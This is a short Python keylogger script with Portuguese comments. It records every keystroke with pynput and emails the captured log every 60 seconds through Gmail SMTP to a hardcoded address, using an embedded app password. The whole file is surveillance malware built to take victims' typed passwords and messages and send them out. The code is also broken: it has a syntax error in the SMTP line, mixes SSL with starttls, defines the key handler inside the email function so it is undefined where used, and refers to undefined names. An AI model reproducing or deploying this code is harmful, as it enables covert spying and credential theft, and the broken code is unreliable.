from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

#configurações do email
EMAIL_ORIGEM = "demokeylogger0@gmail.com"
EMAIL_DESTINO = "demokeylogger0@gmail.com"
SENHA_EMAIL= "sass asas sasa asass" #senha de dois fatores do app do gmail

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = 'dados capturados pelos keylogger'
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP_SSL('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print(f"Erro ao enviar email: {e}")
        log = ""

        #agendar o envio a cada 60 segundos
    Timer(60, enviar_email).start()


    def on_press(key):
        global log
        try:
            log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                log += " "
            elif key == keyboard.Key.enter:
                log += "\n"
            elif key == keyboard.Key.backspace:
                log += "[<] "
            elif key == keyboard.Key.tab:
                log += "\t"
            elif key == keyboard.Key.esc:
                log += " [ESC] "
            elif key in IGNORED_KEYS:
                pass
            else:
                log += f"[{key}]"


#iniciar o keylogger e o envio de email
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()
